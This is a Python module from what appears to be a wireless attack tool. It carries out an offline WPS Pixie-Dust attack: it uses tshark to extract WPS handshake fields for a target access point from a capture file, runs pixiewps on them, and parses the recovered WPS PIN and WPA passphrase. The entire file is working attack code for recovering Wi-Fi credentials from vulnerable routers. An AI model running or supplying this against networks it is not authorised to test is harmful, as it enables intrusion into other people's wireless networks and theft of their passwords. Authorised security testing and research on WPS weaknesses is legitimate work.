"""Offline WPS Pixie-Dust from scan capture files."""

from __future__ import annotations

import re
import subprocess

from ..process import run, which


def _extract_pixie_fields(capfile: str, bssid: str) -> dict[str, str] | None:
    """Pull Pixiewps parameters from a capture via tshark."""
    if not which("tshark"):
        return None
    bssid_low = bssid.lower()
    cmd = [
        "tshark", "-r", capfile, "-n",
        "-Y", f"wps && (wlan.sa == {bssid_low} || wlan.bssid == {bssid_low})",
        "-T", "fields",
        "-e", "wps.enrollee_pubkey",
        "-e", "wps.registrar_pubkey",
        "-e", "wps.enrollee_hash1",
        "-e", "wps.enrollee_hash2",
        "-e", "wps.authkey",
        "-e", "wps.enrollee_nonce",
        "-e", "wps.registrar_nonce",
        "-E", "separator=|",
    ]
    stdout, _, code = run(cmd, timeout=45)
    if code != 0 or not stdout.strip():
        return None

    required_keys = ("pke", "pkr", "e_hash1", "e_hash2", "authkey", "e_nonce")
    # Prefer a single complete tshark row (avoids mixing fields from different
    # WPS exchanges). Fall back to merge only if no complete row exists.
    for line in stdout.splitlines():
        parts = line.split("|")
        if len(parts) < 6:
            continue
        pke, pkr, h1, h2, auth, enonce = (p.strip() for p in parts[:6])
        rnonce = parts[6].strip() if len(parts) > 6 else ""
        fields = {
            "pke": pke, "pkr": pkr, "e_hash1": h1, "e_hash2": h2,
            "authkey": auth, "e_nonce": enonce, "r_nonce": rnonce,
        }
        if all(fields[k] for k in required_keys):
            return fields

    fields = {
        "pke": "", "pkr": "", "e_hash1": "", "e_hash2": "",
        "authkey": "", "e_nonce": "", "r_nonce": "",
    }
    for line in stdout.splitlines():
        parts = line.split("|")
        if len(parts) < 6:
            continue
        pke, pkr, h1, h2, auth, enonce = (p.strip() for p in parts[:6])
        rnonce = parts[6].strip() if len(parts) > 6 else ""
        if pke and not fields["pke"]:
            fields["pke"] = pke
        if pkr and not fields["pkr"]:
            fields["pkr"] = pkr
        if h1 and not fields["e_hash1"]:
            fields["e_hash1"] = h1
        if h2 and not fields["e_hash2"]:
            fields["e_hash2"] = h2
        if auth and not fields["authkey"]:
            fields["authkey"] = auth
        if enonce and not fields["e_nonce"]:
            fields["e_nonce"] = enonce
        if rnonce and not fields["r_nonce"]:
            fields["r_nonce"] = rnonce

    if not all(fields[k] for k in required_keys):
        return None
    return fields


def try_offline_pixie(capfile: str, bssid: str) -> tuple[str | None, str | None]:
    """Run pixiewps on WPS material from *capfile*. Returns (pin, psk)."""
    if not which("pixiewps") or not capfile:
        return None, None

    fields = _extract_pixie_fields(capfile, bssid)
    if not fields:
        return None, None

    cmd = [
        "pixiewps",
        "-e", fields["pke"],
        "-r", fields["pkr"],
        "-s", fields["e_hash1"],
        "-z", fields["e_hash2"],
        "-a", fields["authkey"],
        "-n", fields["e_nonce"],
        "-v", "1",
    ]
    if fields["r_nonce"]:
        cmd.extend(["-m", fields["r_nonce"]])
    cmd.extend(["-b", bssid.replace(":", "").lower()])

    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=90,
            check=False,
        )
        output = (proc.stdout or "") + (proc.stderr or "")
    except (subprocess.TimeoutExpired, OSError):
        return None, None

    pin = psk = None
    if m := re.search(r"WPS PIN:\s*'?([0-9]{8})'?", output, re.I):
        pin = m.group(1)
    if m := re.search(r"WPA PSK:\s*'?([^'\s]+)'?", output, re.I):
        psk = m.group(1)
    return pin, psk